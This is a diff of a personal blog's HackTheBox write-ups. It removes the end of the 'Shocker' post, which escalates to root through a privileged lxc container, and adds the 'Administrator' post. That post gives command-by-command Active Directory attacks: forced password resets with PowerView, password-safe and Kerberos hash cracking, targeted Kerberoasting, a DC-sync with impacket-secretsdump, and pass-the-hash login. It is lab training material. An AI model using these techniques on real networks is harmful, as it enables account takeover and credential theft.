-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>lxc image import alpine.tar.gz <span class="nt">--alias</span> alpine
-lxc init alpine r00t <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
-</pre></td></tr></tbody></table></code></div></div>
+<p>First we create a secure string for the new password, followed by a secure string of our current users credentials, which then allows us to run the exploit and log in with the credentials of Michael:Password123!.</p>
 
-<p>And finally we can mount the file system, start the container and access the root directory to grab our flag:</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre>lxc config device add r00t mydev disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
-</span>lxc start r00t
-lxc <span class="nb">exec </span>r00t /bin/sh
-<span class="nb">cat</span> /mnt/root/root/root.txt
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$UserPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'Password123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'ichliebedich'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'administrator.htb\olivia'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Set-DomainUserPassword <span class="nt">-Identity</span> Michael <span class="nt">-AccountPassword</span> <span class="nv">$UserPassword</span> <span class="nt">-Credential</span> <span class="nv">$Cred</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nb">exit</span>
+&lt;...&gt;
+evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Michael <span class="nt">-p</span> <span class="s1">'Password123!'</span>
 </pre></td></tr></tbody></table></code></div></div>
-<h2 id="what-i-learned-from-this-box"><span class="me-2">What I learned from this box:</span><a href="#what-i-learned-from-this-box" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>You should always check $HOME before you try to setup a container.</p>
+
+<p>Michael has ForceChangePassword control over Benjamin, which allows us to repeat the exploit from above again.</p>
+
+<blockquote class="prompt-danger">
+  <p>Don’t use the same password twice in a real world environment!</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>ichael<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'Password123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'administrator.htb\michael'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Set-DomainUserPassword <span class="nt">-Identity</span> Benjamin <span class="nt">-AccountPassword</span> <span class="nv">$SecPassword</span> <span class="nt">-Credential</span> <span class="nv">$Cred</span>
+&lt;...&gt;
+<span class="nb">exit</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>BloodHound didn’t show us any outbound control for Benjamin, which is why we need to check if our new accounts have access to other protocols.<br />
+Benjamin seems to have access to FTP, which contains a psafe3 file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>ftp benjamin@10.129.95.15
+&lt;...&gt;
+Password:
+&lt;...&gt;
+ftp&gt; <span class="nb">ls</span>
+&lt;...&gt;
+ftp&gt; get Backup.psafe3
+&lt;...&gt;
+ftp&gt; <span class="nb">exit</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>A quick research reveals, that it is a password safe file, which can be cracked with JohnTheRipper.
+First we need to extract the hash via pwsafe2john and then crack it with john.</p>
+
+<blockquote class="prompt-info">
+  <p>If you want to display the password again, after cracking it, you can use “john backup_hash −−show”.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>pwsafe2john Backup.psafe3 <span class="o">&gt;</span> backup_hash
+&lt;...&gt;
+john backup_hash <span class="nt">--wordlist</span><span class="o">==</span>/usr/share/wordlists/rockyou.txt
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Now we can open the file via the Password Safe software and use the password to unlock the vault.</p>
+<blockquote class="prompt-info">
+  <p>Double-click on an entry to copy their password.</p>
+</blockquote>
+
+<p><a href="/post-images/administrator/vault_unlocked.png" class="popup img-link  shimmer"><img src="/post-images/administrator/vault_unlocked.png" alt="Password vault unlocked" loading="lazy"></a></p>
+
+<p>A quick user search in BloodHound reveals, that neither Alexander, nor Emma have any Outbound Object Control.
+Emily on the other hand has GenericWrite control over Ethan, who has GetChangesAll control over the domain, which would allow us to execute a DC-Sync attack.
+<br />
+Lets grab the user flag first:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> emily <span class="nt">-p</span> <span class="s1">'***'</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>mily<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="escalating-our-privileges"><span class="me-2">Escalating our privileges</span><a href="#escalating-our-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>After that taken care of, we can focus on exploiting the GenericWrite control.
+GenericWrite allows us to create a “fake” Kerberos ticket, which we can gather afterwards by running a Kerberoast attack.
+Lets create the “fake” ticket for Ethan first:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>mily<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
+&lt;...&gt;
+Set-DomainObject <span class="nt">-Identity</span> ethan <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'servicePrincipalName'</span><span class="o">=</span><span class="s1">'http/fakehost'</span><span class="o">}</span>
+&lt;...&gt;
+<span class="nb">exit</span>
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Now we can use Impacket-GetUserSPNs to Kerberoast the ticket we generated:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>impacket-GetUserSPNs <span class="nt">-dc-ip</span> 10.129.95.15 administrator.htb/emily <span class="nt">-request-user</span> ethan <span class="nt">-outputfile</span> ethan_hash
+&lt;...&gt;
+Password:
+</pre></td></tr></tbody></table></code></div></div>
+
+<blockquote class="prompt-warning">
+  <p>If you didn’t get the error message “[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)” skip the next step.</p>
+</blockquote>
+
+<p>The error message we received means that the difference in date/time between our machine and the AD is too big to resolve the request.
+To fix it we need to disable network snyc, set our date/time to the time of the AD, execute the Kerberoast and then enable network sync again.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>timedatectl set-ntp off
+&lt;...&gt;
+<span class="nb">sudo </span>rdate <span class="nt">-n</span> &lt;target IP&gt;
+&lt;...&gt;
+impacket-GetUserSPNs <span class="nt">-dc-ip</span> 10.129.95.15 administrator.htb/emily <span class="nt">-request-user</span> ethan <span class="nt">-outputfile</span> ethan_hash
+&lt;...&gt;
+Password:
+&lt;...&gt;
+<span class="nb">sudo </span>timedatectl set-ntp on
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Now, we just need to crack the hash via hashcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 13100 ethan_hash /usr/share/wordlists/rockyou.txt
+&lt;...&gt;
+&lt;Hash&gt;:&lt;Password&gt;
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>This allows us to execute the DC-sync attack. It will display the Administrator password hash, which we can use for pass the hash via Evil-WinRM.</p>
+
+<blockquote class="prompt-info">
+  <p>The structure of the hashes is domain\uid:rid:lmhash:nthash::: . Only copy the nthash section for pass the hash (without :::).</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>impacket-secretsdump <span class="nt">-outputfile</span> domain_hashes <span class="nt">-just-dc</span> administrator.htb/ethan@10.129.95.15
+&lt;...&gt;
+Password:
+&lt;...&gt;
+evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="k">***</span>
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+&lt;...&gt;
+</pre></td></tr></tbody></table></code></div></div>
 
 <h2 id="conclusion"><span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p>Thank you for reading, have a wonderful day and keep hacking!</p>
@@ -1206,29 +1345,19 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/linux/"
+            href="/tags/windows/"
             class="post-tag no-text-decoration"
-          >linux</a>
+          >windows</a>
         
           <a
-            href="/tags/easy/"
+            href="/tags/medium/"
             class="post-tag no-text-decoration"
-          >easy</a>
+          >medium</a>
         
           <a
-            href="/tags/web-attacks/"
+            href="/tags/active-directory/"
             class="post-tag no-text-decoration"
-          >web-attacks</a>
-        
-          <a
-            href="/tags/cgi/"
-            class="post-tag no-text-decoration"
-          >cgi</a>
-        
-          <a
-            href="/tags/priv-esc/"
-            class="post-tag no-text-decoration"
-          >priv-esc</a>
+          >active directory</a>
         
       </div>
     
@@ -1264,21 +1393,21 @@ lxc <span class="nb">exec </span>r00t /bin/sh
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Shocker%20-%20Sanity-Archive&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHack-The-Box-Shocker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=Administrator%20-%20Sanity-Archive&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Shocker%20-%20Sanity-Archive&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHack-The-Box-Shocker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Administrator%20-%20Sanity-Archive&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHack-The-Box-Shocker%2F&text=HackTheBox%20-%20Shocker%20-%20Sanity-Archive" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Administrator%2F&text=Administrator%20-%20Sanity-Archive" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1839,43 +1968,43 @@ lxc <span class="nb">exec </span>r00t /bin/sh
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
 
 
 
@@ -1919,7 +2048,7 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         </article>
       
         <article class="col">
-          <a href="/posts/HackTheBox-Administrator/" class="post-preview card h-100">
+          <a href="/posts/Hack-The-Box-Shocker/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -1931,16 +2060,16 @@ lxc <span class="nb">exec </span>r00t /bin/sh
 
 <time
   
-  data-ts="1760180400"
+  data-ts="1745060400"
   data-df="ll"
   
 >
-  Oct 11, 2025
+  Apr 19, 2025
 </time>
 
-              <h4 class="pt-0 my-2">Administrator</h4>
+              <h4 class="pt-0 my-2">HackTheBox - Shocker</h4>
               <div class="text-muted">
-                <p>Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to rece...</p>
+                <p>Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.</p>
               </div>
             </div>
           </a>
@@ -1988,19 +2117,19 @@ lxc <span class="nb">exec </span>r00t /bin/sh
   
 
   
-    <div class="btn btn-outline-primary disabled" aria-label="Older">
-      <p>-</p>
-    </div>
+    <a
+      href="/posts/HackTheBox-Cap/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>HackTheBox - Cap</p>
+    </a>
   
 
   
-    <a
-      href="/posts/Interactive-Shell-Guide/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>Guide&#58; Interactive Shells</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
